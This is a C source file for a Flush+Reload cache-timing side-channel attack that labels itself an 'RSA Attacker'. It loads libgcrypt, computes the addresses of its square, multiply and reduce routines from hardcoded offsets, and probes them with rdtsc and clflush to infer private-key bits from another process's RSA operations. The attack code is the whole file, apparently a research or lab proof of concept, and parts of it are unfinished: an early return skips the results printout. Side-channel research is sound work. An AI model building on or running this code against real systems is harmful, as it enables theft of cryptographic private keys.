#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <dlfcn.h>

#define CACHE_LINE_SIZE 64
#define NUM_MONITORED_FUNCTIONS 3
#define MEASUREMENT_CYCLES 10000
#define THRESHOLD 200
#define OBSERVATION_WINDOW_US 2

// Symbol offsets from readelf output
// #define POWM_OFFSET        0x000000000004e390
#define SQR_OFFSET    0x0000000000051470
#define MUL_OFFSET    0x0000000000051a70
#define RED_OFFSET    0x0000000000050450

volatile int running = 1;

typedef struct {
    void* address;
    char name[32];
    int hit_count;
    uint64_t *timing_history;
} monitored_function_t;

void signal_handler(int sig) {
    running = 0;
}

// static inline void flush_cache_line(void* addr) {
//     asm volatile ("clflush (%0)" : : "r" (addr) : "memory");
// }

void* get_library_base_address() {
    FILE* maps = fopen("/proc/self/maps", "r");
    if (!maps) return NULL;

    char line[1024];
    void* base_addr = NULL;

    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "libgcrypt.so.11.6.0")) {
            unsigned long addr;
            if (sscanf(line, "%lx-", &addr) == 1) {
                base_addr = (void*)addr;
                break;
            }
        }
    }
    fclose(maps);
    return base_addr;
}

int probe(void* addr) {
    volatile unsigned long time;

    asm __volatile__ (
            " mfence \n"
            " lfence \n"
            " rdtsc \n"
            " lfence \n"
            " movl %%eax, %%esi \n"
            " movl (%1), %%eax \n"
            " lfence \n"
            " rdtsc \n"
            " subl %%esi, %%eax \n"
            " clflush 0(%1) \n"
            : "=a" (time)
            : "c" (addr)
            : "%esi", "%edx");

    return time < THRESHOLD;
}

int main(int argc, char* argv[]) {
    void* lib_handle;
    monitored_function_t funcs[NUM_MONITORED_FUNCTIONS];
    int total_measurements = 0;

    printf("RSA Attacker process starting (PID: %d)\n", getpid());

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    lib_handle = dlopen("./lib/libgcrypt.so.11.6.0", RTLD_NOW);
    if (!lib_handle) {
        fprintf(stderr, "Failed to load libgcrypt: %s\n", dlerror());
        return 1;
    }
    printf("Library handle: %p\n", lib_handle);

    void* base_addr = get_library_base_address();
    if (!base_addr) {
        fprintf(stderr, "Failed to get library base address\n");
        dlclose(lib_handle);
        return 1;
    }
    printf("Library base address: %p\n", base_addr);

    // void* powm_via_dlsym = dlsym(lib_handle, "gcry_mpi_powm");
    // void* powm_calculated = (char*)base_addr + POWM_OFFSET;
    void* sqr_func = (char*)base_addr + SQR_OFFSET;
    void* mul_func = (char*)base_addr + MUL_OFFSET;
    void* red_func = (char*)base_addr + RED_OFFSET;

    // printf("\nCalculated addresses (base + offset):\n");
    // printf("_gcry_mpi_powm dlsym:                   %p\n", powm_via_dlsym);
    // printf("_gcry_mpi_powm calculated:              %p\n", powm_calculated);
    // printf("_gcry_mpih_sqr_n_basecase calculated:   %p\n", sqr_func);
    // printf("_gcry_mpih_mul calculated:              %p\n", mul_func);
    // printf("_gcry_mpih_divrem calculated:           %p\n", red_func);

    // Initialize monitoring structures
    funcs[0].address = sqr_func;
    strcpy(funcs[0].name, "Square");
    funcs[0].hit_count = 0;
    funcs[0].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));

    funcs[1].address = mul_func;
    strcpy(funcs[1].name, "Multiply");
    funcs[1].hit_count = 0;
    funcs[1].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));

    funcs[2].address = red_func;
    strcpy(funcs[2].name, "Reduce");
    funcs[2].hit_count = 0;
    funcs[2].timing_history = malloc(MEASUREMENT_CYCLES * sizeof(uint64_t));

    printf("RSA Attacker: Monitoring functions:\n");
    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        printf("  %s: %p\n", funcs[i].name, funcs[i].address);
    }

    printf("RSA Attacker: Starting RSA key bit recovery attack...\n");
    printf("RSA Attacker: Monitoring square/multiply pattern to recover private key bits\n");
    printf("RSA Attacker: Press Ctrl+C to stop and show results\n");

    while (running && total_measurements < MEASUREMENT_CYCLES) {
        // Flush all monitored functions
        // for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        //     flush_cache_line(funcs[i].address);
        // }

        // Wait for victim to execute RSA operations
        usleep(OBSERVATION_WINDOW_US);

        // Measure access times
        for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
            funcs[i].hit_count += probe(funcs[i].address);
        }

        total_measurements++;
    }

    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        printf("%d: %d\n", i, funcs[i].hit_count);
    }

    return 0;

    printf("\n=== RSA KEY RECOVERY ATTACK RESULTS ===\n");
    printf("Total measurements: %d\n", total_measurements);
    printf("\nFunction access patterns:\n");

    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        double hit_rate = (double)funcs[i].hit_count / total_measurements * 100;
        printf("%-10s (addr %p): %6d hits (%.2f%%)",
               funcs[i].name, funcs[i].address, funcs[i].hit_count, hit_rate);

        if (hit_rate > 10.0) {
            printf(" <- ACTIVE");
        }
        printf("\n");
    }

    // Cleanup
    for (int i = 0; i < NUM_MONITORED_FUNCTIONS; i++) {
        free(funcs[i].timing_history);
    }

    dlclose(lib_handle);
    return 0;
}
